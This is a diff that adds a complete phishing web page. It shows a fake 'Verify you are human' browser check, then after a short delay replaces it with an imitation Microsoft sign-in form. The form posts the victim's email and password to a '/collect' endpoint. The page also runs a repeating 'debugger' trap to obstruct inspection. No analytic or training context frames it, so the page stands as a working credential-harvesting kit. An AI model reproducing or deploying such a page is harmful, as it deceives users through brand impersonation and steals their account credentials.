@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Just a moment...</title>
+  <script src="/static/turnstile/v0/api.js" async defer></script>
+</head>
+<body>
+  <div id="gate">
+    <h1>Verify you are human</h1>
+    <p>this page is running browser checks to ensure your security</p>
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAAADnPIDROzbs0Aaj"></div>
+  </div>
+  <div id="login" style="display:none">
+    <img src="/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
+    <h2>Sign in to your Microsoft account</h2>
+    <form method="post" action="/collect">
+      <input type="email" name="loginfmt" placeholder="Email, phone, or Skype">
+      <input type="password" name="passwd" placeholder="Password">
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+  <script src="/shared/1.0/content/js/ConvergedLogin_PCore.js"></script>
+  <script>
+    setInterval(function () { debugger; }, 1000);
+    setTimeout(function () {
+      document.getElementById('gate').style.display = 'none';
+      document.getElementById('login').style.display = 'block';
+    }, 300);
+  </script>
+</body>
+</html>
